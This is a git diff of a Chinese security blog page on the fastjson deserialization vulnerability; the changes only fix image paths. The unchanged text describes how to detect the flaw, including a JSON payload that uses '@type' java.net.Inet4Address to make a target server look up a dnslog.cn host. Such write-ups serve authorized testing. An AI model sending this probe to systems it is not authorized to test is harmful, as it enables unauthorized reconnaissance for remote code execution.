@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="echozt">
 <meta property="og:description" content="验证网站是否存在fastjson漏洞的方法~~">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/1.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/2.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/3.png">
-<meta property="og:image" content="https://echozt.github.io/posts/undefined/4.png">
+<meta property="og:image" content="https://echozt.github.io/posts/4554/1.png">
+<meta property="og:image" content="https://echozt.github.io/posts/4554/2.png">
+<meta property="og:image" content="https://echozt.github.io/posts/4554/3.png">
+<meta property="og:image" content="https://echozt.github.io/posts/4554/4.png">
 <meta property="article:published_time" content="2022-10-12T07:23:47.000Z">
-<meta property="article:modified_time" content="2022-10-12T08:42:47.722Z">
+<meta property="article:modified_time" content="2022-10-12T08:45:13.494Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="框架漏洞">
 <meta property="article:tag" content="fastjson">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://echozt.github.io/posts/undefined/1.png">
+<meta name="twitter:image" content="https://echozt.github.io/posts/4554/1.png">
   
   
   <title>fastjson反序列化漏洞 - echozt</title>
@@ -252,7 +252,7 @@
 <p>    影响版本：fastjson&lt;=1.2.80</p>
 <p>    漏洞类型：远程任意代码执行</p>
 <h1 id="四、漏洞探测"><a href="#四、漏洞探测" class="headerlink" title="四、漏洞探测"></a>四、漏洞探测</h1><h3 id="1、根据返回包判断"><a href="#1、根据返回包判断" class="headerlink" title="1、根据返回包判断"></a>1、根据返回包判断</h3><p>    任意抓包，将提交方式改为POST。返回包就会出现fastjson字样。</p>
-<p> <img src="/posts/undefined/1.png" srcset="/img/loading.gif" lazyload class></p>
+<p> <img src="/posts/4554/1.png" srcset="/img/loading.gif" lazyload class></p>
 <p>2、修改请求包</p>
 <p>    用burp抓包，将发送方式改为post，更改类型为json，添加json格式的字符串，可以看到返回包中成功了。</p>
 <pre class="line-numbers language-bash"><code class="language-bash">POST
@@ -264,7 +264,7 @@ Content-Type: application/json
 <span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"Bl2e"</span>
 <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/undefined/2.png" srcset="/img/loading.gif" lazyload class></p>
+<p>  <img src="/posts/4554/2.png" srcset="/img/loading.gif" lazyload class></p>
 <h3 id="3、利用dnslog平台"><a href="#3、利用dnslog平台" class="headerlink" title="3、利用dnslog平台"></a>3、利用dnslog平台</h3><p>修改请求包，将GET方法改为POST，更改类型为json，添加json格式的字符串：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">POST
 
@@ -272,9 +272,9 @@ Content-Type: application/json
 
 <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"zeo":&amp;#123;"@type":"java.net.Inet4Address","val":"6xyymf.dnslog.cn"&amp;#125;&amp;#125;  //val替换成自己获取到的dnslog</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/undefined/3.png" srcset="/img/loading.gif" lazyload class></p>
+<p>  <img src="/posts/4554/3.png" srcset="/img/loading.gif" lazyload class></p>
 <p>    发送之后，在dnslog平台上refresh record 可以成功得到值，说明存在漏洞。</p>
-<p> <img src="/posts/undefined/4.png" srcset="/img/loading.gif" lazyload class></p>
+<p> <img src="/posts/4554/4.png" srcset="/img/loading.gif" lazyload class></p>
 
             </div>
             <hr>
